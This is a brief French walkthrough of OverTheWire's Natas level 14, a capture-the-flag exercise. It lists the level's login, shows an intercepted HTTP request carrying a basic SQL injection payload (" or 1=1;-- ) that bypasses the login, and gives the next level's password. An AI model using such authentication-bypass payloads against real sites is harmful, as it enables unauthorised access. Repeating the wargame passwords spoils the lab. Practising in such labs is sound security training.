username : natas14
password : z3UYcr4v4uBpeX8f7EZbMHlzK4UR2XtQ

- On arrive sur un formulaire Login/MDP avec du php et du SQL -> Injection SQL
- On cree une requete et on l'intercepte : 
```sql 
POST /index.php HTTP/1.1
Host: natas14.natas.labs.overthewire.org
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 19
Origin: http://natas14.natas.labs.overthewire.org
Authorization: Basic bmF0YXMxNDp6M1VZY3I0djR1QnBlWDhmN0VaYk1IbHpLNFVSMlh0UQ==
Connection: close
Referer: http://natas14.natas.labs.overthewire.org/index.php
Upgrade-Insecure-Requests: 1

username=" or 1=1;-- &password=
```
- On essaye une injection SQL basique 
->  On est connecté : Mot de passe : **SdqIqBsFcz3yotlNYErZSZwblkm0lrvx**

